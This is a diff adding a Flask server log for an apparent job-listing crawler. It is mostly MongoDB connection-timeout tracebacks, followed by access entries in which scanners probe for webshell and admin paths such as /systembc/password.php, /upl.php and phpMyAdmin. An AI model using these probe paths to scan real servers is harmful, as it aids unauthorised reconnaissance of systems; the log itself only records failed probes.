+             ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 402, in select_server
+    server = self._select_server(
+             ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 380, in _select_server
+    servers = self.select_servers(
+              ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 287, in select_servers
+    server_descriptions = self._select_servers_loop(
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 337, in _select_servers_loop
+    raise ServerSelectionTimeoutError(
+pymongo.errors.ServerSelectionTimeoutError: {ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms), Timeout: 30s, Topology Description: <TopologyDescription id: 67a356c4af26359cc72d6a77, topology_type: Unknown, servers: [<ServerDescription ('{ip}', 27017) server_type: Unknown, rtt: None, error=AutoReconnect('{ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms)')>]>
+211.36.146.121 - - [05/Feb/2025 12:53:23] "[35m[1mGET /api/last-crawl HTTP/1.1[0m" 500 -
+47.236.242.199 - - [05/Feb/2025 12:56:08] code 400, message Bad request version ('À\x13À')
+47.236.242.199 - - [05/Feb/2025 12:56:08] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03I\x06²ù¼\x99iÀYûøºe-\x83Ud]\x0e\x8d·b8´gÆÝ9dZ8f gÁ\x81i³öòË°©\x19NÖ½\x95g|püé<Z¡\x90T·é¥8'O;\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+47.236.242.199 - - [05/Feb/2025 12:56:19] "GET / HTTP/1.1" 200 -
+111.7.96.158 - - [05/Feb/2025 12:56:46] "GET / HTTP/1.1" 200 -
+111.7.96.158 - - [05/Feb/2025 12:56:46] "GET / HTTP/1.1" 200 -
+111.7.96.158 - - [05/Feb/2025 12:56:58] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+[2025-02-05 12:57:26,588] ERROR in app: Exception on /api/jobs/count [GET]
+Traceback (most recent call last):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/intern_zip/app.py", line 85, in get_job_counts
+    counts = list(collection.aggregate(pipeline))
+                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 2978, in aggregate
+    return self._aggregate(
+           ^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 2886, in _aggregate
+    return self._database.client._retryable_read(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1861, in _retryable_read
+    return self._retry_internal(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1828, in _retry_internal
+    ).run()
+      ^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2565, in run
+    return self._read() if self._is_read else self._write()
+           ^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2700, in _read
+    self._server = self._get_server()
+                   ^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2656, in _get_server
+    return self._client._select_server(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1647, in _select_server
+    server = topology.select_server(
+             ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 402, in select_server
+    server = self._select_server(
+             ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 380, in _select_server
+    servers = self.select_servers(
+              ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 287, in select_servers
+    server_descriptions = self._select_servers_loop(
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 337, in _select_servers_loop
+    raise ServerSelectionTimeoutError(
+pymongo.errors.ServerSelectionTimeoutError: {ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms), Timeout: 30s, Topology Description: <TopologyDescription id: 67a356c4af26359cc72d6a76, topology_type: Unknown, servers: [<ServerDescription ('{ip}', 27017) server_type: Unknown, rtt: None, error=AutoReconnect('{ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms)')>]>
+111.7.96.158 - - [05/Feb/2025 12:57:26] "[35m[1mGET /api/jobs/count HTTP/1.1[0m" 500 -
+[2025-02-05 12:57:26,719] ERROR in app: Exception on /api/last-crawl [GET]
+Traceback (most recent call last):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/intern_zip/app.py", line 95, in get_last_crawl_time
+    last_crawl = meta_collection.find_one({"type": "last_crawl"})
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 1755, in find_one
+    for result in cursor.limit(-1):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1281, in __next__
+    return self.next()
+           ^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1257, in next
+    if len(self._data) or self._refresh():
+                          ^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1205, in _refresh
+    self._send_message(q)
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1100, in _send_message
+    response = client._run_operation(
+               ^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1752, in _run_operation
+    return self._retryable_read(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1861, in _retryable_read
+    return self._retry_internal(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1828, in _retry_internal
+    ).run()
+      ^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2565, in run
+    return self._read() if self._is_read else self._write()
+           ^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2700, in _read
+    self._server = self._get_server()
+                   ^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2656, in _get_server
+    return self._client._select_server(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1647, in _select_server
+    server = topology.select_server(
+             ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 402, in select_server
+    server = self._select_server(
+             ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 380, in _select_server
+    servers = self.select_servers(
+              ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 287, in select_servers
+    server_descriptions = self._select_servers_loop(
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 337, in _select_servers_loop
+    raise ServerSelectionTimeoutError(
+pymongo.errors.ServerSelectionTimeoutError: {ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms), Timeout: 30s, Topology Description: <TopologyDescription id: 67a356c4af26359cc72d6a77, topology_type: Unknown, servers: [<ServerDescription ('{ip}', 27017) server_type: Unknown, rtt: None, error=AutoReconnect('{ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms)')>]>
+111.7.96.158 - - [05/Feb/2025 12:57:26] "[35m[1mGET /api/last-crawl HTTP/1.1[0m" 500 -
+[2025-02-05 12:57:35,098] ERROR in app: Exception on /api/jobs/count [GET]
+Traceback (most recent call last):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/intern_zip/app.py", line 85, in get_job_counts
+    counts = list(collection.aggregate(pipeline))
+                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 2978, in aggregate
+    return self._aggregate(
+           ^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 2886, in _aggregate
+    return self._database.client._retryable_read(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1861, in _retryable_read
+    return self._retry_internal(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1828, in _retry_internal
+    ).run()
+      ^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2565, in run
+    return self._read() if self._is_read else self._write()
+           ^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2700, in _read
+    self._server = self._get_server()
+                   ^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2656, in _get_server
+    return self._client._select_server(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1647, in _select_server
+    server = topology.select_server(
+             ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 402, in select_server
+    server = self._select_server(
+             ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 380, in _select_server
+    servers = self.select_servers(
+              ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 287, in select_servers
+    server_descriptions = self._select_servers_loop(
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 337, in _select_servers_loop
+    raise ServerSelectionTimeoutError(
+pymongo.errors.ServerSelectionTimeoutError: {ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms), Timeout: 30s, Topology Description: <TopologyDescription id: 67a356c4af26359cc72d6a76, topology_type: Unknown, servers: [<ServerDescription ('{ip}', 27017) server_type: Unknown, rtt: None, error=AutoReconnect('{ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms)')>]>
+58.127.213.184 - - [05/Feb/2025 12:57:35] "[35m[1mGET /api/jobs/count HTTP/1.1[0m" 500 -
+[2025-02-05 12:57:35,231] ERROR in app: Exception on /api/last-crawl [GET]
+Traceback (most recent call last):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/intern_zip/app.py", line 95, in get_last_crawl_time
+    last_crawl = meta_collection.find_one({"type": "last_crawl"})
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 1755, in find_one
+    for result in cursor.limit(-1):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1281, in __next__
+    return self.next()
+           ^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1257, in next
+    if len(self._data) or self._refresh():
+                          ^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1205, in _refresh
+    self._send_message(q)
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1100, in _send_message
+    response = client._run_operation(
+               ^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1752, in _run_operation
+    return self._retryable_read(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1861, in _retryable_read
+    return self._retry_internal(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1828, in _retry_internal
+    ).run()
+      ^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2565, in run
+    return self._read() if self._is_read else self._write()
+           ^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2700, in _read
+    self._server = self._get_server()
+                   ^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2656, in _get_server
+    return self._client._select_server(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1647, in _select_server
+    server = topology.select_server(
+             ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 402, in select_server
+    server = self._select_server(
+             ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 380, in _select_server
+    servers = self.select_servers(
+              ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 287, in select_servers
+    server_descriptions = self._select_servers_loop(
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 337, in _select_servers_loop
+    raise ServerSelectionTimeoutError(
+pymongo.errors.ServerSelectionTimeoutError: {ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms), Timeout: 30s, Topology Description: <TopologyDescription id: 67a356c4af26359cc72d6a77, topology_type: Unknown, servers: [<ServerDescription ('{ip}', 27017) server_type: Unknown, rtt: None, error=AutoReconnect('{ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms)')>]>
+58.127.213.184 - - [05/Feb/2025 12:57:35] "[35m[1mGET /api/last-crawl HTTP/1.1[0m" 500 -
+179.43.191.146 - - [05/Feb/2025 13:41:40] "GET / HTTP/1.1" 200 -
+20.118.69.179 - - [05/Feb/2025 13:42:59] "[33mGET /hudson HTTP/1.1[0m" 404 -
+141.255.166.90 - - [05/Feb/2025 14:17:21] "GET / HTTP/1.1" 200 -
+87.121.84.7 - - [05/Feb/2025 14:24:55] "GET / HTTP/1.1" 200 -
+80.82.77.202 - - [05/Feb/2025 15:01:06] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+80.82.77.202 - - [05/Feb/2025 15:01:06] "[31m[1m\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RHÅ\x1a#÷:Nßâ´\x82/ÿ\x09T\x9f§Äy°hÆ\x13\x8c¤\x1c="á\x1a\x98 \x84´,\x85¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À[0m" 400 -
+101.32.218.31 - - [05/Feb/2025 15:02:36] "[33mHEAD /Core/Skin/Login.aspx HTTP/1.1[0m" 404 -
+54.244.71.16 - - [05/Feb/2025 15:09:25] "GET / HTTP/1.1" 200 -
+54.244.71.16 - - [05/Feb/2025 15:09:44] "[33mGET /dist/js/bootstrap.bundle.min.js HTTP/1.1[0m" 404 -
+54.244.71.16 - - [05/Feb/2025 15:09:44] "[33mGET /cdn.js HTTP/1.1[0m" 404 -
+54.244.71.16 - - [05/Feb/2025 15:09:44] "[33mGET /kit.fontawesome.com/0c69fdf2c0.js HTTP/1.1[0m" 404 -
+111.21.192.221 - - [05/Feb/2025 15:42:23] "GET / HTTP/1.1" 200 -
+47.91.91.123 - - [05/Feb/2025 15:51:07] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03þp\x9f\x84BX\x00\x9cÓã@nd7½y¶2}WîÈ\x87\x96B~\x9cñSØQµ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+47.91.91.123 - - [05/Feb/2025 15:51:07] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03þp\x9f\x84BX\x00\x9cÓã@nd7½y¶2}WîÈ\x87\x96B~\x9cñSØQµ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+18.222.224.209 - - [05/Feb/2025 15:54:10] "GET / HTTP/1.1" 200 -
+18.222.224.209 - - [05/Feb/2025 15:54:40] "GET / HTTP/1.1" 200 -
+18.222.224.209 - - [05/Feb/2025 15:57:32] code 400, message Bad request syntax ('SSH-2.0-Go')
+18.222.224.209 - - [05/Feb/2025 15:57:32] "[31m[1mSSH-2.0-Go[0m" 400 -
+18.222.224.209 - - [05/Feb/2025 15:58:03] code 400, message Bad request version ('À\x14À')
+18.222.224.209 - - [05/Feb/2025 15:58:03] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03çØ\x14p\x93c\x08Âîdí×\x0bç\x8aY\x86íÂ\x06§¶\\\x1f?'à\x0d\x84|òc\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+160.30.21.34 - - [05/Feb/2025 15:58:17] "[33mCONNECT www.google.com:443 HTTP/1.1[0m" 404 -
+18.222.224.209 - - [05/Feb/2025 16:00:34] code 400, message Bad request version ('À\x14À')
+18.222.224.209 - - [05/Feb/2025 16:00:34] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x031C|\x86û\x9fEíÂ\x86\x86Ê+\x141&ðõÇ\x1e>³' \x17ÛÇè\x1aP´û\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+66.240.236.116 - - [05/Feb/2025 16:06:43] "GET / HTTP/1.1" 200 -
+47.88.6.178 - - [05/Feb/2025 16:30:01] "GET / HTTP/1.1" 200 -
+47.88.94.161 - - [05/Feb/2025 16:30:02] "[33mGET /Public/home/js/check.js HTTP/1.1[0m" 404 -
+47.89.193.162 - - [05/Feb/2025 16:30:03] "[33mGET /static/admin/javascript/hetong.js HTTP/1.1[0m" 404 -
+101.32.218.31 - - [05/Feb/2025 16:44:18] "[33mHEAD /Core/Skin/Login.aspx HTTP/1.1[0m" 404 -
+185.242.226.10 - - [05/Feb/2025 16:47:03] "GET / HTTP/1.1" 200 -
+43.166.1.243 - - [05/Feb/2025 17:49:29] "GET / HTTP/1.1" 200 -
+165.227.135.234 - - [05/Feb/2025 17:57:00] code 400, message Bad request version ('À\x14À')
+165.227.135.234 - - [05/Feb/2025 17:57:00] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x1d» ü\x1d\x1d\x89%´ªL\x94[\x9fN*Ë;@É\x99£\x83\x82¡¢ù\x1c°À\x90\x1f\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+165.227.135.234 - - [05/Feb/2025 17:57:00] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03`\x08)0\x8f\x1a«m\x97vö¼\x97:\x9ck\x9f´b{DÍ=:\x94O¿R\x91S\x11Å\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+165.227.135.234 - - [05/Feb/2025 17:57:00] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03`\x08)0\x8f\x1a«m\x97vö¼\x97:\x9ck\x9f´b{DÍ=:\x94O¿R\x91S\x11Å\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+165.227.135.234 - - [05/Feb/2025 17:57:01] "GET / HTTP/1.1" 200 -
+165.227.135.234 - - [05/Feb/2025 17:57:02] "[33mGET /form.html HTTP/1.1[0m" 404 -
+165.227.135.234 - - [05/Feb/2025 17:57:02] "[33mGET /upl.php HTTP/1.1[0m" 404 -
+165.227.135.234 - - [05/Feb/2025 17:57:03] "[33mGET /t4 HTTP/1.1[0m" 404 -
+165.227.135.234 - - [05/Feb/2025 17:57:03] "[33mGET /geoip/ HTTP/1.1[0m" 404 -
+165.227.135.234 - - [05/Feb/2025 17:57:04] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+165.227.135.234 - - [05/Feb/2025 17:57:05] "[33mGET /1.php HTTP/1.1[0m" 404 -
+165.227.135.234 - - [05/Feb/2025 17:57:05] "[33mGET /systembc/password.php HTTP/1.1[0m" 404 -
+165.227.135.234 - - [05/Feb/2025 17:57:06] "[33mGET /password.php HTTP/1.1[0m" 404 -
+2.57.122.161 - - [05/Feb/2025 17:59:20] "[33mGET /3/3/3/3/3/3/3/3/3/3/3/3/3/3/3/3 HTTP/1.1[0m" 404 -
+141.255.166.90 - - [05/Feb/2025 18:15:37] "GET / HTTP/1.1" 200 -
+212.237.4.64 - - [05/Feb/2025 18:21:40] "[33mGET /phpMyAdmin-5.2.1-all-languages/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:41] "[33mGET /phpMyAdmin-4.9.10-all-languages/index.php?lang=en HTTP/1.1[0m" 404 -
